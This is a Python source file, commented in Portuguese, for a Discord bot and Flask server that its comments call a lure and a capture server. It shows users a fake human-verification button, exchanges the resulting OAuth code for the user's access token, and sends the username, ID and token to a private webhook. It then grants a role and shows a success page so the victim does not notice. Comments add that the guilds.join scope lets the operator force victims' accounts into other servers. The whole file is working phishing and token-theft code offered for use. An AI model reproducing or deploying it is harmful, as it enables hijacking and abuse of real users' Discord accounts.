import discord
from discord.ext import commands
from flask import Flask, request, render_template_string
import requests
import os
from dotenv import load_dotenv
import threading

# Carrega as variáveis do arquivo .env (usado localmente)
# No Railway, as variáveis são configuradas na aba "Variables" do painel
load_dotenv()

# Atribuição das variáveis de ambiente
BOT_TOKEN = os.getenv('BOT_TOKEN')
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
REDIRECT_URI = os.getenv('REDIRECT_URI')
WEBHOOK_URL = os.getenv('WEBHOOK_URL')
VERIFIED_ROLE_ID = int(os.getenv('VERIFIED_ROLE_ID', 0))

# --- PARTE 1: O BOT DO DISCORD (A ISCA) ---
intents = discord.Intents.default()
intents.message_content = True
intents.members = True # Obrigatório para dar cargos aos usuários
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Bot online como {bot.user}')
    print(f'Servidor de captura ativo. Redirecionando para: {REDIRECT_URI}')

@bot.command()
async def setup(ctx):
    # Link de autorização OAuth2 (Escopos: identify e guilds.join)
    # O guilds.join permite que você force a conta da vítima a entrar em outros servers
    auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20guilds.join"
    
    embed = discord.Embed(
        title="🛡️ Verificação de Segurança",
        description="Para liberar o acesso aos canais do servidor, você precisa confirmar que é um humano clicando no botão abaixo.",
        color=0x00FF00
    )
    
    # Criando o botão que leva a vítima para a página de autorização do Discord
    view = discord.ui.View()
    button = discord.ui.Button(label="Registrar / Verificar", url=auth_url, style=discord.ButtonStyle.link)
    view.add_item(button)
    
    await ctx.send(embed=embed, view=view)

# --- PARTE 2: O SERVIDOR DE CAPTURA (FLASK) ---
app = Flask(__name__)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "Erro na verificação", 400

    try:
        # 1. Troca o código temporário do Discord pelo Access Token da conta da vítima
        data = {
            'client_id': CLIENT_ID,
            'client_secret': CLIENT_SECRET,
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': REDIRECT_URI
        }
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        token_res = requests.post('https://discord.com/api/oauth2/token', data=data, headers=headers).json()
        access_token = token_res.get('access_token')

        # 2. Usa o token capturado para pegar as informações básicas da conta (Nome e ID)
        user_res = requests.get('https://discord.com/api/users/@me', headers={'Authorization': f'Bearer {access_token}'}).json()
        username = user_res.get('username')
        user_id = user_res.get('id')

        # 3. EXFILTRAÇÃO: Envia os dados capturados para o seu servidor privado via Webhook
        webhook_data = {
            "content": f"🚨 **NOVO TOKEN CAPTURADO!**\n**Usuário:** {username}\n**ID:** {user_id}\n**Token:** `{access_token}`"
        }
        requests.post(WEBHOOK_URL, json=webhook_data)

        # 4. LIBERAÇÃO: Dá o cargo de verificado para a vítima não desconfiar do processo
        bot.loop.create_task(give_role(user_id))

        # Página de sucesso simples para a vítima não suspeitar
        return render_template_string("""
            <h1 style='font-family: sans-serif; text-align: center; margin-top: 50px;'>✅ Verificação Concluída!</h1>
            <p style='font-family: sans-serif; text-align: center;'>Seu acesso foi liberado. Você já pode voltar para o Discord e acessar os canais.</p>
        """)

    except Exception as e:
        print(f"Erro no processamento: {e}")
        return "Erro interno no servidor de verificação", 500

async def give_role(user_id):
    try:
        # Localiza o servidor onde o bot está e atribui o cargo ao usuário
        guild = bot.guilds[0] 
        member = await guild.fetch_member(int(user_id))
        role = guild.get_role(VERIFIED_ROLE_ID)
        await member.add_roles(role)
        print(f"Cargo entregue com sucesso para {user_id}")
    except Exception as e:
        print(f"Erro ao dar cargo: {e}")

# --- EXECUÇÃO ---
def run_flask():
    # IMPORTANTE: Railway define a porta via variável de ambiente. 
    # Se não encontrar, usa a porta 5000 por padrão.
    port = int(os.getenv("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

if __name__ == "__main__":
    # Inicia o Flask em uma thread separada para que o bot do Discord possa rodar simultaneamente
    t = threading.Thread(target=run_flask)
    t.start()
    
    # Inicia o bot do Discord
    bot.run(BOT_TOKEN)
